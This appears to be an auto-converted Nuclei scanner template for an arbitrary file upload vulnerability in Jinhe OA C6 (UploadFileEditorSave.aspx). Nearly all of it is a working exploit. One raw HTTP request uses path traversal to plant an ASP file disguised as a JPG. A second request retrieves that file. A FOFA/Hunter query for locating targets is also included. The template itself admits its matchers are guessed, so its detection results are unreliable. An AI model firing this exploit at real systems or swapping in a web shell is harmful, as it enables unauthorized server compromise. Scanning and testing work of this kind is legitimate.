info:
  name: 金和OAC6UploadFileEditorSave存在任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/17025911fb2235e2258f174988ae8a2f

    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: 17025911fb2235e2258f174988ae8a2f
    fofa: + hunter`app.name="金和 OA"`
http:
- raw:
  - 'POST /C6/Control/UploadFileEditorSave.aspx?filename=\....\....\C6\8tlj8jsoj2.asp HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0

    Connection: close

    Content-Length: 303

    Content-Type: multipart/form-data; boundary=----3oox7pq44le5x6qwwj8a

    Accept-Encoding: gzip, deflate


    ------3oox7pq44le5x6qwwj8a

    Content-Disposition: form-data; name="file"; filename="8tlj8jsoj2.jpg"

    Content-Type: image/png


    <% response.write(111*111)

    set myfso=server.CreateObject("scripting.filesystemobject")

    myfso.DeleteFile(Server.MapPath("8tlj8jsoj2.asp"))%>


    ------3oox7pq44le5x6qwwj8a--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /C6/8tlj8jsoj2.asp HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0

    Connection: close

    Cookie: ASP.NET_SessionId=xzurv45ywzzqpor5nppga4qv

    Accept-Encoding: gzip, deflate'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
